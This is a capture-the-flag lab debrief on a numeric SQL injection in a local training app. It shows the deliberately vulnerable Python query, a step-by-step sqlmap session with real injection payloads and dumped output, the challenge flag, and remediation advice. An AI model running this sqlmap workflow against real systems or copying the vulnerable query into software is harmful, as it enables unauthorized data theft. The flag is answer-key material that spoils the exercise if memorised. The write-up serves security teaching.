# Automated Floor Skip, Debrief

**Node:** `p2_1` &middot; **Flag:** `SEIYAKU{sqlmap_walks_the_floors}` &middot; **Route:** `GET /p2/floors` &middot; **Sink:** `challenges/phase2.py`, `mariadb` (`floors` table, `vault_floors` table)

## Root cause

The floor lookup builds its query with raw f-string concatenation, same
sink shape as every floor on the written exam, except this time the
value is spliced in as a bare, unquoted number:

```python
# challenges/phase2.py
q = f"SELECT id, name, description FROM floors WHERE id={floor_id}"  # VULN: string concat
cur.execute(q)
rows = cur.fetchall()
```

Every earlier floor needed a closing `'` to break out of a string
literal first. This one needs nothing at all, `id` sits directly in
numeric context, so anything that's still valid SQL after the number
(`AND`, `OR`, `UNION`, a subquery) rides straight into the query with no
quote-escaping required. That single detail, a plain, unquoted numeric
parameter, is exactly the shape every SQLi scanner's default heuristics
are built to try first, and it happens to leave four independent
channels open through the same parameter at once:

- **boolean-blind**, `id=1 AND 1=1` renders floor 1's row; `id=1 AND
  1=2` renders "no floor found." Two distinguishable pages, no error
  needed.
- **error-based**, a malformed injection throws a raw MariaDB
  exception, and (same house style as p1_2) that raw exception text is
  echoed straight back to the page.
- **UNION-based**, the query's 3-column result set (`id, name,
  description`) is rendered directly into the page's table, so a
  matching `UNION SELECT` surfaces attacker-chosen values as ordinary
  rows, same technique as p1_3.
- **time-based blind**, `id=1 AND SLEEP(N)` (or the stacked/subquery
  variants sqlmap prefers) delays the response with zero visible
  difference in the page, same technique as p1_5.

`vault_floors`, the table actually holding this floor's flag, is never
touched by any query `/p2/floors` constructs on its own. It only becomes
reachable by riding one of the four channels above into a `UNION SELECT`
or subquery against it.

This floor's lesson isn't a new SQL technique, it's that all five
Phase-1 techniques can live behind one single, boring-looking parameter,
and that a working scanner will find every one of them faster than
picking a technique by hand ever could.

## The technique: driving sqlmap instead of hand-crafting payloads

Every earlier floor's DEBRIEF walked a payload by hand. This floor is
solved by driving a tool through its standard workflow instead. The
shape of that workflow never changes, target to target:

1. **Give sqlmap the request.** Either a URL (`-u "http://host/path?id=1"`)
   or, more realistically for anything behind auth/cookies/custom
   headers, a raw HTTP request saved to a file and replayed with `-r`.
2. **Point it at the parameter and let it confirm the injection.**
   `-p id` tells it which parameter to test; `--batch` answers every
   interactive prompt with the default so it runs unattended.
3. **Enumerate downward once it confirms.** `--dbs` -> `-D <db>
   --tables` -> `-D <db> -T <table> --columns` -> `-D <db> -T <table>
   --dump`. Each step narrows scope using what the previous step found.

### Saving the request

```
GET /p2/floors?id=1 HTTP/1.1
Host: localhost:8000
User-Agent: seiyaku-arc-solver
Accept: */*
Connection: close

```

(this is exactly what `solvers/p2_1.sh` writes to a temp file before
calling sqlmap, see that script for the generation step.)

### A gotcha worth knowing: `--ignore-stdin`

Running sqlmap non-interactively (from a script, CI, or anywhere stdin
isn't an attached terminal) needs one extra flag that isn't obvious from
the docs. When stdin isn't a TTY, sqlmap treats it as an *alternative*
target-list source (so you can pipe in a list of URLs), and with `-r`
already supplying the target, that stdin-pipe path races it, hits EOF
immediately, and sqlmap exits having never actually scanned anything
(no error, just a suspiciously instant "ending @ ..."). `--ignore-stdin`
forces `-r`'s request file to be the sole target source. Every command
below includes it for exactly this reason, worth remembering any time
sqlmap is driven from automation instead of an interactive shell.

### Step 1, confirm the injection

```
sqlmap -r req.txt -p id --batch --ignore-stdin -v 1
```

Real output from this exact seed:

```
[13:27:28] [INFO] parsing HTTP request from 'req.txt'
[13:27:28] [INFO] testing connection to the target URL
[13:27:28] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:27:28] [INFO] testing if the target URL content is stable
[13:27:29] [INFO] target URL content is stable
[13:27:29] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[13:27:29] [INFO] testing for SQL injection on GET parameter 'id'
[13:27:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:27:29] [WARNING] reflective value(s) found and filtering out
[13:27:29] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="200")
[13:27:29] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:27:29] [INFO] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
[13:27:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:27:40] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[13:27:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:27:40] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns.
[13:27:40] [INFO] target URL appears to have 3 columns in query
[13:27:40] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 6015=6015

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1 AND EXTRACTVALUE(9849,CONCAT(0x5c,0x71717a7a71,(SELECT (ELT(9849=9849,1))),0x7176767071))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 8474 FROM (SELECT(SLEEP(5)))dWIj)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT CONCAT(0x71717a7a71,0x4774416774686c434e7172706848505077577566557866556755686376446447594e63716a624149,0x7176767071),NULL,NULL-- -
---
[13:28:05] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
```

(This is a real, live run against this exact seed, not a hypothetical
transcript. Note all four techniques from the root-cause section above,
found by sqlmap's plain defaults, zero `--level`/`--risk`/`--technique`
tuning.)

### Step 2, the banner

```
sqlmap -r req.txt -p id --batch --ignore-stdin --banner
```

```
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
banner: '11.8.9-MariaDB-ubu2404'
```

### Step 3, enumerate databases

```
sqlmap -r req.txt -p id --batch --ignore-stdin --dbs
```

```
available databases [2]:
[*] information_schema
[*] seiyaku
```

### Step 4, enumerate tables in `seiyaku`

```
sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku --tables
```

```
Database: seiyaku
[10 tables]
+--------------+
| applicants   |
| door         |
| floors       |
| keeper       |
| patients     |
| records      |
| results      |
| staff        |
| vault        |
| vault_floors |
+--------------+
```

Nine of these ten back other floors across the whole exam (`applicants`,
`door`, `keeper`, `patients`, `records`, `results`, `staff`, `vault`,
Phase 1's tables), `floors` and `vault_floors` are this floor's own.
`vault_floors` stands out as the one name this route's own display page
never mentions anywhere.

### Step 5, enumerate columns of `vault_floors`

```
sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku -T vault_floors --columns
```

```
Database: seiyaku
Table: vault_floors
[3 columns]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| floor_name | varchar(64)  |
| id         | int(11)      |
| secret     | varchar(128) |
+------------+--------------+
```

### Step 6, dump it

```
sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku -T vault_floors --dump
```

```
Database: seiyaku
Table: vault_floors
[1 entry]
+----+----------------------------------+------------------+
| id | secret                           | floor_name       |
+----+----------------------------------+------------------+
| 1  | SEIYAKU{sqlmap_walks_the_floors} | Floor 0 (sealed) |
+----+----------------------------------+------------------+
```

The whole chain also works skipping straight to the dump, letting sqlmap
pick the current database on its own (`solvers/p2_1.sh` runs exactly
this shorter form):

```
sqlmap -r req.txt -p id --batch --ignore-stdin --dump -T vault_floors
```

```
[13:28:05] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[13:28:05] [INFO] fetching current database
[13:28:05] [INFO] fetching columns for table 'vault_floors' in database 'seiyaku'
[13:28:05] [INFO] fetching entries for table 'vault_floors' in database 'seiyaku'
Database: seiyaku
Table: vault_floors
[1 entry]
+----+----------------------------------+------------------+
| id | secret                           | floor_name       |
+----+----------------------------------+------------------+
| 1  | SEIYAKU{sqlmap_walks_the_floors} | Floor 0 (sealed) |
+----+----------------------------------+------------------+
```

Both forms are genuine live output from this exact stack, the shorter
one is faster to type, the longer one is what actually teaches the
enumeration shape (`--dbs` -> `--tables` -> `--columns` -> `--dump`)
that generalizes to a target where you *don't* already know the table
name to skip straight to.

## `--technique`, `--level`, `--risk`, and why defaults were enough here

**`--technique`** picks which detection families sqlmap will try, as a
string of letters:

| Letter | Technique |
|---|---|
| `B` | Boolean-based blind |
| `E` | Error-based |
| `U` | UNION query-based |
| `S` | Stacked queries |
| `T` | Time-based blind |
| `Q` | Inline queries |

The default is effectively "try all of them", this floor was built so
that default behavior alone (no `--technique` filtering at all) finds
`B`, `E`, `U`, and `T` in one pass, which is exactly what the transcript
above shows.

**`--level`** (1-5) controls *how many payloads* sqlmap tries per
technique, and where it looks for injectable parameters, higher levels
add tests against cookies, the `User-Agent`/`Referer` headers, and more
exotic payload variants, on top of GET/POST parameters. **`--risk`**
(1-3) controls how *aggressive* those payloads are allowed to be, risk 2
adds time-based payloads that can noticeably slow a target, risk 3 adds
payloads that include `OR`-based conditions capable of matching (and, in
the wrong context, updating) far more rows than intended, plus
heavier-handed boolean tests.

Both default to `1`. Nothing above required raising either, the
injection point, all four techniques, and the full enumeration chain all
came from sqlmap's out-of-the-box defaults.

**Why `--level 5 --risk 3` against a real client is a red flag, not a
power move:** cranking both to max multiplies the request count by
roughly an order of magnitude (every extra header, every extra payload
variant, every extra technique gets tried against every parameter), which
against a production target means far more noise in logs/WAF/IDS
alerting, a real chance of tripping rate limits or account lockouts
(especially against login-shaped parameters), and, this is the risk-3
part specifically, payloads deliberately chosen because they're more
likely to affect rows beyond the one being tested. Running max
level/risk against a system you don't have explicit, scoped authorization
to test that aggressively is exactly the kind of thing that turns an
authorized engagement into an incident. The professional default is the
same one sqlmap ships with: start at `--level 1 --risk 1`, and only raise
either deliberately, against a scope that's been explicitly cleared for
it, once the lower setting has been given a real chance to work, which,
as this floor demonstrates, is most of the time.

## HxH analogy

Trick Tower's whole design leans on applicants following its rules at
human speed, one floor, one rule, one attempt at a time. Every floor's
rule was written by someone who tested it the same slow way it expects
everyone else to test it. Nothing about the tower's rules changes if the
thing testing them isn't a person at all: a tool that tries every known
"floor-skip", every technique, every parameter, every combination, in
the time it takes a human to read the rule board, isn't cheating the
tower's own logic. It's just moving through the same rule set faster
than the tower's author ever accounted for.

sqlmap is that tool for SQL injection specifically: a systematic,
exhaustive checklist of every known technique, run against every
reachable parameter, far faster than working through them by hand one at
a time. The Silent Room (p1_4) and the Medical Bay (p1_5) each took real,
patient, character-by-character effort to solve manually. This floor's
lesson is that the same categories of technique, boolean, error, union,
time, don't have to be rediscovered from scratch on every new target.
Automating the search is the loophole; the tower was never built to
account for an applicant who skips the floors instead of climbing them.

## Remediation

- **Parameterized queries, always**, the same root fix as every floor
  on this exam:

  ```python
  cur.execute(
      "SELECT id, name, description FROM floors WHERE id=%s",
      (floor_id,),
  )
  ```

  With `floor_id` passed as a bound parameter, it can never be re-parsed
  as SQL grammar, `AND`, `UNION`, `SLEEP`, `EXTRACTVALUE`, all of it
  depend entirely on attacker text reaching the query as *code* rather
  than *data*, which parameterization removes as a possibility outright.
  This is doubly true for a bare numeric parameter: "it's just an int, it
  can't be dangerous" is precisely the assumption this floor exists to
  break.
- **Least-privilege database accounts.** Even a fully successful
  injection here should never be able to reach a table like
  `vault_floors` that this route's own legitimate queries never touch. A
  DB user scoped to only the tables a route actually needs turns "the
  query can technically ask this" into "the query is rejected before it
  ever runs", the same principle every earlier floor's debrief closes
  on, worth repeating because it's the single highest-leverage mitigation
  in this whole lab.
- **Defense-in-depth beyond the code fix.** This floor's whole point is
  that automated scanning finds injection fast, which cuts both ways.
  Fixing the immediate query is necessary but not sufficient on a real
  system: a WAF tuned to flag the same payload shapes sqlmap generates
  (`UNION SELECT`, `EXTRACTVALUE(`, `SLEEP(`, stacked `;`), least-
  privilege DB accounts as above so a missed injection point still can't
  reach sensitive tables, and monitoring/alerting on abnormal query
  volume or timing all reduce the blast radius of the *next* bug, not
  just this one. A scanner as capable as sqlmap being freely available
  to attackers is exactly why "we fixed the one bug we know about" was
  never the finish line.
